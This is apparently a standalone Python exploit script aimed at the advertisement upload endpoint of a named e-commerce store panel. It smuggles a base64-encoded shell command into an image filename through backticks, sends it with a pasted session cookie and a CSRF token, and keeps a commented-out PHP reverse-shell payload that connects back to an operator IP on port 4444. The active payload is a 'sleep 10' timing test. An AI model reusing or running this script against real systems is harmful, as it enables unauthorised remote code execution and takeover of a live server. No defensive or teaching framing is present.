import requests
import base64

# --- CONFIGURATION ---
URL = "https://new.snocart.com/store-panel/advertisement/store"
# Paste your NEW cookie here
COOKIE_VAL = "eyJpdiI6InAwb21jS1AvcWZsYTBKeUFlMDVlWmc9PSIsInZhbHVlIjoiUWI5cE5qTGU1VzJBbVhsRStISThmOC84NDlZcjZ0QkNxZXhDTkUvMHlwdDhoZ3QxZ3pHcnVzRHhWZExGdkt0Q0tGNkkxM1hMcEc2NE5ER2NXNWxiSzNvdkphTHRzL2lDMmFrSGJmYnAvQTF3KzBwV1Y1cWIyamRUb2JCKytEYXEiLCJtYWMiOiI1ZTQwMDVlNzIzZmExMmFhNmMyYjQxODYxMGEwYzk4M2JlYTYwYjQ3ZjYwYWQ0ZTM2MTczY2I0YTc5NGY5NzM3IiwidGFnIjoiIn0%3D"
# Paste your IP here
MY_IP = "122.161.241.53" 

# --- PAYLOAD GENERATION ---
# rev_shell = f"php -r '$s=fsockopen(\"{MY_IP}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
# payload = base64.b64encode(rev_shell.encode()).decode()
# filename = f'audit.jpg`echo {payload} | base64 -d | sh`.jpg'

# This payload runs: sleep 10
payload_cmd = "sleep 10"
payload = base64.b64encode(payload_cmd.encode()).decode()
filename = f'audit.jpg`echo {payload} | base64 -d | sh`.jpg'

# --- THE ATTACK ---
headers = {
    "Cookie": f"6ammart1736944350app_envlive_session={COOKIE_VAL}",
    "User-Agent": "Mozilla/5.0"
}

# We get a fresh CSRF from the cookie if possible, or just ask you
csrf = input("Please enter fresh CSRF token from browser console: ")

files = {
    'cover_image': (filename, b'\xff\xd8\xff\xe0', 'image/jpeg'),
    'profile_image': ('p.jpg', b'\xff\xd8\xff\xe0', 'image/jpeg')
}

data = {
    "_token": csrf,
    "store_id": "1",
    "title[0]": "AutoAudit",
    "advertisement_type": "store_promotion",
    "dates": "07/04/2026 - 07/14/2026",
    "translations": '[{"locale":"en","key":"title","value":"Test"}]'
}

print("[*] Sending Reverse Shell payload...")
r = requests.post(URL, headers=headers, files=files, data=data)
print(f"[!] Server Response: {r.status_code}")